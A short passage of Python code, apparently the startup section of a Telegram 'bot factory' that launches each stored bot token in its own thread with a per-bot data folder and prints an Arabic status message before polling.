    all_bots = get_all_bots()
    for token, data in all_bots.items():
        owner_id = data['owner_id']
        bot_data_dir = os.path.join(BOTS_DATA_DIR, token.replace(":", "_"))
        if not os.path.exists(bot_data_dir): os.makedirs(bot_data_dir)
        threading.Thread(target=run_new_bot, args=(token, owner_id, bot_data_dir), daemon=True).start()
    
    print(f"✅ مصنع البوتات يعمل... تم تشغيل {len(all_bots)} بوت.")
    factory_bot.infinity_polling(skip_pending=True)